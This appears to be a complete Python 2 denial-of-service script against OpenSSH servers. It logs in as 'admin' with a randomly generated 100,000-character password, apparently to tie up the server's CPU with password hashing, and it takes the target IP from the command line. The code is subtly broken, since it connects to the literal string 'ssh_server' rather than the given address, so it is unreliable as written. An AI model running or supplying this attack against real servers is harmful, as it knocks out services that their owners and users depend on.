import sys
import paramiko
from random import choice 
from string import lowercase 

def ssh_login(ssh_server):
    pass_len = 100000
    passwd = "".join(choice(lowercase) for i in range(pass_len))

    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh_conn.connect('ssh_server', username='admin', password=passwd )

def main():
    while len(sys.argv) != 2:
        print "Usage: python openssh_dos.py IPAddress"
        break
    ssh_login(sys.argv[1])

if __name__ == "__main__":
    main()



